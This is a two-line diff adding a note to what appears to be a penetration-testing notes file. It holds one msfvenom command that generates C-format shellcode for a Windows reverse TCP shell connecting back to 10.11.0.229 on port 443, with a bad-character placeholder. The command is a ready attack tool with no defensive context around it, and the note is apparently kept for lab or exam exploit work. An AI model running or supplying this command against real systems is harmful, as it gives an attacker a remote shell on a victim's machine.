@@ -1,0 +1,2 @@
+#shellcode generation
+msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.229 LPORT=443 -f c -b "whateveryourbadcharsare" EXITFUNC=thread
